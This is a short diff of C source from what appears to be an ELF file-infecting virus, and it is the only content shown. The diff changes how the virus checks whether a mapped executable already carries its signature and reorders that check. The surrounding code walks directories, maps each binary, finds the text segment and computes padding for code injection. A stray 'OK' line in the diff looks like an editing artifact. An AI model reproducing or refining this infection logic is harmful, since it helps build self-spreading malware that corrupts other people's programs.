@@ -153,9 +153,8 @@ static int		test_elf_hdr(void) {
 
 OK
 static int		check_infection(void) {
-	if (sz.mem < SIGN_SZ)
-		return (-1);
-	if (!str_n_cmp((char *)(mem + sz.mem - SIGN_SZ), SIGN, SIGN_SZ))
+	if (!str_n_cmp((char *)(mem + hdrs.txt->p_offset + hdrs.txt->p_filesz +
+			sz.load - SIGN_SZ), SIGN, SIGN_SZ))
 		return (-1);
 	return (0);
 }
@@ -222,7 +221,7 @@ static void		proc_entries(uint64_t dir_ret, char *root_path) {
 		if (map_file(buffs.path) < 0)
 			continue;
 		hdrs.elf = (Elf64_Ehdr *)mem;
-		if (!check_infection() && !test_elf_hdr() && !find_txt_seg()) {
+		if (!test_elf_hdr() && !find_txt_seg() && !check_infection()) {
 			sz.f_pad = hdrs.nxt->p_offset - (hdrs.txt->p_offset + hdrs.txt->p_filesz);
 			sz.m_pad = hdrs.nxt->p_vaddr - (hdrs.txt->p_vaddr + hdrs.txt->p_memsz);
 			if (!set_x_pad()) {
